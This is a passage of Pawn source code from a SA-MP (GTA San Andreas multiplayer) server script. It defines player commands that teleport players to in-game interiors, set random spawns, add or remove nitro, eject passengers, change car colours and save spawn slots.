	format(strings, sizeof(strings), "You have teleported to Personal Care %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_bus(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bus <1 (Blasti' Fools) 2 (Budget Inn) 3 (Jefferson) 4 (Off-track Betting)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bus <5 (XXX Shop) 6 (Sindacco Meat) 7 (Zero's RC Shop) 8 (Dillimore)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 8)
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bus <1 (Blasti' Fools) 2 (Budget Inn) 3 (Jefferson) 4 (Off-track Betting)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bus <5 (XXX Shop) 6 (Sindacco Meat) 7 (Zero's RC Shop) 8 (Dillimore)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:BusinessTeleports[8][5] = {
		{1038.509888,-0.663752,1001.089966,0.0,3.0},
		{446.622986,509.31897,1001.419983,0.0,12.0},
		{2216.339844,-1150.509888,1025.799927,0.0,15.0},
		{833.81897,7.418,1004.179993,90.0,3.0},
		{-100.325996,-22.8165,1000.741943,45.0,3.0},
		{964.376953,2157.329834,1011.019958,180.0,1.0},
		{-2239.569824,130.020996,1035.419922,0.0,6.0},
 		{662.641601,-571.398803,16.343263,90.0,0.0}
 	};

	SetPlayerPosEx(playerid, BusinessTeleports[teleid-1][0], BusinessTeleports[teleid-1][1], BusinessTeleports[teleid-1][2], BusinessTeleports[teleid-1][3], floatround(BusinessTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Bussines %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_casino(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /casino <1 (Caligula) 2-4 (Four Dragons) 5 (Redsand)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /casino <1 (Caligula) 2-4 (Four Dragons) 5 (Redsand)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:CasinoTeleports[5][5] = {
 		{2170.284,1618.629,999.9766,0.0,1.0},
   		{1889.975,1018.055,31.88281,270.0,10.0},
    	{-2158.719971,641.287964,1052.369995,90.0,1.0},
     	{-2169.846435,642.365905,1057.586059,270.0,1.0},
      	{1133.069946,-9.573059,1000.75,0.0,12.0}
   	};

	SetPlayerPosEx(playerid, CasinoTeleports[teleid-1][0], CasinoTeleports[teleid-1][1], CasinoTeleports[teleid-1][2], CasinoTeleports[teleid-1][3], floatround(CasinoTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Casino %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_cloth(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cloth <1 (Binco) 2 (Didier Sachs) 3 (Pro Laps)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cloth <4 (Suburban) 5 (Victim) 6 (Zip)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cloth <1 (Binco) 2 (Didier Sachs) 3 (Pro Laps)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cloth <4 (Suburban) 5 (Victim) 6 (Zip)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:ClothingTeleports[6][5] = {
		{207.737991,-109.019997,1005.269958,0.0,15.0},
  		{204.332993,-166.694992,1000.578979,0.0,14.0},
    	{207.054993,-138.804993,1003.519958,0.0,3.0},
     	{203.778,-48.492397,1001.799988,0.0,1.0},
      	{226.293991,-7.43153,1002.259949,90.0,5.0},
       	{161.391006,-93.159156,1001.804687,0.0,18.0}
    };

	SetPlayerPosEx(playerid, ClothingTeleports[teleid-1][0], ClothingTeleports[teleid-1][1], ClothingTeleports[teleid-1][2], ClothingTeleports[teleid-1][3], floatround(ClothingTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Clothing Store %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_club(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /club <1-2 (Dance club(with DJ)) 3 (Pool Table Bar) 3 (Lil' Probe Inn)");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /club <1-2 (Dance club(with DJ)) 3 (Pool Table Bar) 3 (Lil' Probe Inn)");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:ClubTeleports[4][5] = {
 		{493.390991,-22.722799,1000.686951,0.0,17.0},
	 	{476.068328,-14.893922,1003.695312,270.0,17.0},
	 	{501.980988,-69.1502,998.834961,180.0,11.0},
	 	{-227.028,1401.22998,27.769798,315.0,18.0}
 	};

	SetPlayerPosEx(playerid, ClubTeleports[teleid-1][0], ClubTeleports[teleid-1][1], ClubTeleports[teleid-1][2], ClubTeleports[teleid-1][3], floatround(ClubTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Club %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_eat(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /eat <1 (Jay) 2 (Gant Bridge) 3 (Street Valley) 4 (World of Coq) 5 (Truck Stop)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /eat <1 (Jay) 2 (Gant Bridge) 3 (Street Valley) 4 (World of Coq) 5 (Truck Stop)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:EatTeleports[5][5] = {
		{460.099976,-88.428497,999.621948,90.0,4.0},
		{454.97395,-110.104996,999.717957,90.0,5.0},
		{435.271331,-80.958938,999.554687,337.0,6.0},
		{452.48999,-18.179699,1001.179993,45.0,1.0},
		{681.474976,-451.15097,-25.616798,180.0,1.0}
	};

	SetPlayerPosEx(playerid, EatTeleports[teleid-1][0], EatTeleports[teleid-1][1], EatTeleports[teleid-1][2], EatTeleports[teleid-1][3], floatround(EatTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Eatery %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_fast(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /fast <1 (Burger) 2 (Cluckin' Bell) 3 (Well-Stacked Pizza) 4 (Rusty Brown's doughnuts)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /fast <1 (Burger) 2 (Cluckin' Bell) 3 (Well-Stacked Pizza) 4 (Rusty Brown's doughnuts)>");

	new Float:FFoodTeleports[4][5] = {
		{366.92398,-72.929359,1001.507812,315.0,10.0},
		{365.672974,-10.7132,1001.869995,315.0,9.0},
		{372.35199,-131.650986,1001.449951,0.0,5.0},
		{377.098999,-192.439987,1000.643982,0.0,17.0}
	};

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	SetPlayerPosEx(playerid, FFoodTeleports[teleid-1][0], FFoodTeleports[teleid-1][1], FFoodTeleports[teleid-1][2], FFoodTeleports[teleid-1][3], floatround(FFoodTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Fast Food %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_girl(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /girl <1 (Denise) 2 (Katie) 3 (Helena) 4 (Michelle) 5 (barbara) 6 Millie)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /girl <1 (Denise) 2 (Katie) 3 (Helena) 4 (Michelle) 5 (barbara) 6 Millie)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:GirlfriendTeleports[6][5] = {
		{244.411987,305.03299,999.231995,235.0,1.0},
		{271.884979,306.631989,999.325989,90.0,2.0},
		{291.28299,310.031982,999.154968,90.0,3.0},
		{302.181,300.722992,999.231995,0.0,4.0},
		{322.197998,302.497986,999.231995,0.0,5.0},
		{346.870025,309.259033,999.1557,180.0,6.0}
	};

	SetPlayerPosEx(playerid, GirlfriendTeleports[teleid-1][0], GirlfriendTeleports[teleid-1][1], GirlfriendTeleports[teleid-1][2], GirlfriendTeleports[teleid-1][3], floatround(GirlfriendTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Girlfriend %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_gov(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gov <1 (Sherman Dam) 2 (Citty Planning Dep.) 3-6 (Area 51)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gov <1 (Sherman Dam) 2 (Citty Planning Dep.) 3-6 (Area 51)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:GovernmentTeleports[6][5] = {
		{-959.873962,1952.0,9.04431,180.0,17.0},
		{388.871979,173.804993,1008.389954,90.0,3.0},
		{220.4109,1862.277,13.147,90.0,0.0},
		{226.853637,1822.760498,7.414062,90.0,0.0},
		{268.725585,1883.816406,-30.09375,180.0,0.0},
		{245.696197,1862.490844,18.070953,120.0,0.0}
	};

	SetPlayerPosEx(playerid, GovernmentTeleports[teleid-1][0], GovernmentTeleports[teleid-1][1], GovernmentTeleports[teleid-1][2], GovernmentTeleports[teleid-1][3], floatround(GovernmentTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Government Facility %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_gym(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gym <1 (LS Ganton) 2 (SF Garcia) 3 (LV Red Belt) 4 (LS Verona Beach) 5 (LS Madd Dogg)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gym <1 (LS Ganton) 2 (SF Garcia) 3 (LV Red Belt) 4 (LS Verona Beach) 5 (LS Madd Dogg)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:GymTeleports[5][5] = {
		{772.112,-3.89865,1000.687988,0.0,5.0},
		{774.213989,-48.924297,1000.687988,0.0,6.0},
		{773.579956,-77.096695,1000.687988,0.0,7.0},
		{668.393188,-1867.325439,5.45372,90.0,0.0},
		{1234.144409,-764.087158,1084.007202,0.0,5.0}
	};

	SetPlayerPosEx(playerid, GymTeleports[teleid-1][0], GymTeleports[teleid-1][1], GymTeleports[teleid-1][2], GymTeleports[teleid-1][3], floatround(GymTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Gym %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_homie(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /homie <1-2 (B Dup's apartment) 3 (CJ) 4-6 (Madd Dogg)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /homie <7 (OG Loc) 8 (Ryder) 9 (Sweet) 10-17 (Big Smoke)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 17)
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /homie <1-2 (B Dup's apartment) 3 (CJ) 4-6 (Madd Dogg)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /homie <7 (OG Loc) 8 (Ryder) 9 (Sweet) 10-17 (Big Smoke)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:HomieTeleports[17][5] = {
		{1527.22998,-11.574499,1002.269958,0.0,3.0},
		{1523.509888,-47.821198,1002.269958,0.0,2.0},
		{2496.049805,-1693.929932,1014.75,180.0,3.0},
		{1263.079956,-785.30896,1091.959961,0.0,5.0},
		{1299.079956,-795.22699,1084.029907,0.0,5.0},
		{1291.725341,-788.319885,96.460937,90.0,0.0},
		{516.65,-18.611898,1001.459961,0.0,3.0},
		{2464.109863,-1698.659912,1013.509949,90.0,2.0},
		{2526.459961,-1679.089966,1015.5,270.0,1.0},
		{2543.659912,-1303.629883,1025.069946,180.0,2.0},
		{2530.980468,-1294.163085,1031.421875,270.0,2.0},
		{2569.185058,-1281.929809,1037.773437,180.0,2.0},
		{2564.201171,-1297.117797,1044.125,90.0,2.0},
		{2526.605468,-1281.239259,1048.289062,180.0,2.0},
		{2535.017822,-1281.242553,1054.640625,180.0,2.0},
		{2547.26831,-1295.931762,1054.640625,0.0,2.0},
		{2580.114501,-1300.392944,1060.992187,90.0,2.0}
	};

	SetPlayerPosEx(playerid, HomieTeleports[teleid-1][0], HomieTeleports[teleid-1][1], HomieTeleports[teleid-1][2], HomieTeleports[teleid-1][3], floatround(HomieTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Homie Teleport %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_strip(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /strip <1 (Big Spread) 2 (Fanny Batter) 3-4 (Topless Girl's)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /strip <5 (Unnamed Brothel) 6 (Tiger Skin Rug) 7-8 (Jizzy's)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 8)
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /strip <1 (Big Spread) 2 (Fanny Batter) 3-4 (Topless Girl's)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /strip <5 (Unnamed Brothel) 6 (Tiger Skin Rug) 7-8 (Jizzy's)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:IllTeleports[8][5] = {
		{1212.019897,-28.663099,1001.089966,180.0,3.0},
		{744.542969,1437.669922,1102.73999,290.0,6.0},
		{1204.809937,-11.5868,1001.089966,0.0,2.0},
		{1204.809937,13.5868,1001.089966,0.0,2.0},
		{940.921997,-17.007,1001.179993,0.0,3.0},
		{964.106995,-53.205498,1001.179993,90.0,3.0},
		{-2661.009766,1415.73999,923.305969,180.0,3.0},
		{-2637.449951,1404.629883,906.457947,90.0,3.0}
	};

	SetPlayerPosEx(playerid, IllTeleports[teleid-1][0], IllTeleports[teleid-1][1], IllTeleports[teleid-1][2], IllTeleports[teleid-1][3], floatround(IllTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Strip Club %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_msc(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /msc <1-8>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 8)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /msc <1-8>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:MiscellaneousTeleports[8][5] = {
		{2350.339844,-1181.649902,1028.0,90.0,5.0},
		{2807.619873,-1171.899902,1025.579956,0.0,8.0},
		{318.564972,1118.209961,1083.97998,0.0,5.0},
		{1412.639893,-1.78751,1000.931946,135.0,1.0},
		{1302.519897,-1.78751,1000.931946,135.0,18.0},
		{2522.0,-1673.383911,14.8,90.0,0.0},
		{-219.322601,1410.444824,27.773437,90.0,18.0},
		{2324.419922,-1147.539917,1050.719971,0.0,12.0}
	};

	SetPlayerPosEx(playerid, MiscellaneousTeleports[teleid-1][0], MiscellaneousTeleports[teleid-1][1], MiscellaneousTeleports[teleid-1][2], MiscellaneousTeleports[teleid-1][3], floatround(MiscellaneousTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Misc. Teleport %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_lib(playerid,params[])
{
	new idx;


	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lib <1 (Outside) 2 (Patio) 3 (Upstairs) 4 (Backyard) 5 (roof) 6 (Kitchen)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lib <1 (Outside) 2 (Patio) 3 (Upstairs) 4 (Backyard) 5 (roof) 6 (Kitchen)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:LibertyTeleports[6][5] = {
		{-735.5619504,484.351318,1371.95227,40.0,1.0},
		{-777.7556764,500.17807,1376.600463,90.0,1.0},
		{-794.8064,491.6866,1376.195,0.0,1.0},
		{-835.2504,500.9161,1358.305,0.0,1.0},
		{-813.431518,533.231079,1390.782958,90.0,1.0},
		{-789.4328,509.146972,1367.374511,180.0,1.0}
	};

	SetPlayerPosEx(playerid, LibertyTeleports[teleid-1][0], LibertyTeleports[teleid-1][1], LibertyTeleports[teleid-1][2], LibertyTeleports[teleid-1][3], floatround(LibertyTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Liberty City %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_pol(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pol <1 (LS PD) 2 (SF PD) 3-4 (LV PD)");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pol <1 (LS PD) 2 (SF PD) 3-4 (LV PD)");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:PoliceTeleports[4][5] = {
		{246.783997,63.9002,1003.639954,0.0,6.0},
		{246.375992,109.245995,1003.279968,0.0,10.0},
		{288.745972,169.350998,1007.179993,0.0,3.0},
		{238.661987,141.051987,1003.049988,0.0,3.0}
	};

	SetPlayerPosEx(playerid, PoliceTeleports[teleid-1][0], PoliceTeleports[teleid-1][1], PoliceTeleports[teleid-1][2], PoliceTeleports[teleid-1][3], floatround(PoliceTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Police %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_sch(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sch <1 (Motorcycle) 2 (Vehicle) 3 (Aviation) 4 (Boat)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sch <1 (Motorcycle) 2 (Vehicle) 3 (Aviation) 4 (Boat)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:SchoolTeleports[4][5] = {
		{1494.429932,1305.629883,1093.289917,90.0,3.0},
		{-2029.719971,-115.067993,1035.169922,90.0,3.0},
		{420.484985,2535.589844,10.020289,45.0,10.0},
		{-2184.751464,2413.111816,5.15625,45.0,0.0}
	};

	SetPlayerPosEx(playerid, SchoolTeleports[teleid-1][0], SchoolTeleports[teleid-1][1], SchoolTeleports[teleid-1][2], SchoolTeleports[teleid-1][3], floatround(SchoolTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to School %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_sta(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sta <1 (8 Track) 2-3 (Bloodbowl) 4 (Dirtbike) 5 (Kickstart)");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sta <6 (VC Street Racers) 7 (Bandit's Baseball field)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 7)
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sta <1 (8 Track) 2-3 (Bloodbowl) 4 (Dirtbike) 5 (Kickstart)");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sta <6 (VC Street Racers) 7 (Bandit's Baseball field)>");
		return 1;
	}

	new Float:StadiumTeleports[7][5] = {
		{-1397.78247,-203.723114,1051.346801,90.0,7.0},
		{-1398.103515,933.445434,1041.53125,0.0,15.0},
		{-1396.110351,903.513671,1041.52539,315.0,15.0},
		{-1428.809448,-663.595886,1060.219848,45.0,4.0},
		{-1486.861816,1642.145996,1060.671875,225.0,14.0},
		{-1401.83,107.0513,1032.273,90.0,1.0},
		{1382.6156,2184.345703,11.023437,135.0,0.0}
	};

	SetPlayerPosEx(playerid, StadiumTeleports[teleid-1][0], StadiumTeleports[teleid-1][1], StadiumTeleports[teleid-1][2], StadiumTeleports[teleid-1][3], floatround(StadiumTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Stadium %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_ls(playerid,params[])
{
	#pragma unused params

	new rand = random(sizeof(LSSpawns));
	SetPlayerPosEx(playerid, LSSpawns[rand][0], LSSpawns[rand][1], LSSpawns[rand][2], LSSpawns[rand][3], 0);
	return 1;
}

dcmd_sf(playerid,params[])
{
	#pragma unused params

	new rand = random(sizeof(SFSpawns));
	SetPlayerPosEx(playerid, SFSpawns[rand][0], SFSpawns[rand][1], SFSpawns[rand][2], SFSpawns[rand][3], 0);
	return 1;
}

dcmd_lv(playerid,params[])
{
	#pragma unused params

	new rand = random(sizeof(LVSpawns));
	SetPlayerPosEx(playerid, LVSpawns[rand][0], LVSpawns[rand][1], LVSpawns[rand][2], LVSpawns[rand][3], 0);
	return 1;
}

dcmd_mc(playerid,params[])
{
	#pragma unused params

	new rand = random(sizeof(CHILLIADSpawns));
	SetPlayerPosEx(playerid, CHILLIADSpawns[rand][0], CHILLIADSpawns[rand][1], CHILLIADSpawns[rand][2], CHILLIADSpawns[rand][3], 0);
	return 1;
}

dcmd_arch(playerid,params[])
{
	#pragma unused params

	new rand = random(sizeof(ARCHSpawns));
	SetPlayerPosEx(playerid, ARCHSpawns[rand][0], ARCHSpawns[rand][1], ARCHSpawns[rand][2], ARCHSpawns[rand][3], 0);
	return 1;
}

dcmd_tune(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

 	TogglePlayerControllable(playerid, 0);
	ShowMenuForPlayer(TuningMenu,playerid);
	return 1;
}

dcmd_nos(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	/*if (!TunableVehicles( GetPlayerVehicleID(playerid) ))
	return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle doesn't support nitro");*/

	else
	AddVehicleComponent( GetPlayerVehicleID(playerid) , 1010);
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: 10x NOS added");
	return 1;
}

dcmd_delnos(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	/*if (!TunableVehicles( GetPlayerVehicleID(playerid) ))
	return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle doesn't support nitro");*/

	else
	RemoveVehicleComponent( GetPlayerVehicleID(playerid) , 1010);
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: NOS removed");
	return 1;
}

dcmd_eject(playerid,params[])
{
	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /eject <name|id> ");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (giveplayerid == playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You cannot eject yourself");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
	    GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		if (GetPlayerVehicleID(playerid) == GetPlayerVehicleID(giveplayerid))
		{
			format(strings, sizeof(strings), "[SUCCESS]: You have ejected %s (ID: %d) from your vehicle", giveplayername, giveplayerid);
			SendClientMessage(playerid, COLOR_YELLOW, strings);
			format(strings, sizeof(strings), "%s (ID: %d) has ejected you from their vehicle", playername, playerid);
			SendClientMessage(giveplayerid, COLOR_YELLOW, strings);
			RemovePlayerFromVehicle(giveplayerid);
		} else {
			format(strings, sizeof(strings), "%s (ID: %d) is not inside your vehicle!", giveplayername, giveplayerid);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_carcolour(playerid,params[])
return dcmd_carcolor(playerid,params);

dcmd_carcolor(playerid,params[])
{
	new idx,
		color1,
		color2;

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

    tmps2 = strtok(params, idx);

    if (!strlen(tmps2))
	return SendErrorMessage(playerid, EMBED_WHITE, "/carcolor <color1|random> <color2> [0-250]");

   	if (!strcmp(tmps2, "random", true))
	{
 		color1 = random(250);
 		color2 = random(250);
		format(strings, sizeof(strings), "[SUCCESS]: Vehicle's colors randomly changed to %d - %d", color1, color2);
		goto fcarcolor;
	}

    if (!IsNumeric(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 250)
	return SendErrorMessage(playerid, EMBED_WHITE, "/carcolor <color1|random> <color2> [0-250]");
	color1 = strval(tmps2);

 	tmps2 = strtok(params, idx);
	if (strlen(tmps2))
	{
	    if (!IsNumeric(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 250)
		return SendErrorMessage(playerid, EMBED_WHITE, "/carcolor <color1> <color2> [0-250]");

		color2 = strval(tmps2);
		format(strings, sizeof(strings), "[SUCCESS]: Vehicle's colours changed to %d - %d", color1, color2);
	} else {
	    color2 = color1;
		format(strings, sizeof(strings), "[SUCCESS]: Vehicle's colours changed to %d", color1);
	}

	fcarcolor:
	ChangeVehicleColor(GetPlayerVehicleID(playerid), color1, color2);
	SendClientMessage(playerid, COLOR_ORANGE, strings);
	return 1;
}

dcmd_setspawn(playerid,params[])
{
	#pragma unused params

  	ShowPlayerDialog(playerid, DIALOGID_SPAWN, DIALOG_STYLE_MSGBOX, "xMovie Spawn Selection", "Where would you like to spawn?", "spawn 1", "spawn 2");
	return 1;
}

dcmd_spawn(playerid,params[])
{
	new spawnslotID;
	if (sscanf(params, "d", spawnslotID))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /spawn <1-3>");

	if (spawnslotID < 1 || spawnslotID > MAX_SPAWNS)
	return SendErrorMessage(playerid, EMBED_WHITE, "/spawn <1-3>");
	spawnslotID -= 1;

	if (IsPlayerInAnyVehicle(playerid))
	GetVehicleZAngle( GetPlayerVehicleID(playerid), playerxyza[3]);
	else GetPlayerFacingAngle(playerid, playerxyza[3]);

	GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	playerxyzaiv[playerid][spawnslotID][0] = playerxyza[0];
	playerxyzaiv[playerid][spawnslotID][1] = playerxyza[1];
	playerxyzaiv[playerid][spawnslotID][2] = playerxyza[2];
	playerxyzaiv[playerid][spawnslotID][3] = playerxyza[3];
	player[playerid][interior] = GetPlayerInterior(playerid);

	new world = GetPlayerVirtualWorld(playerid);
	if (IsVIP(playerid))
	{
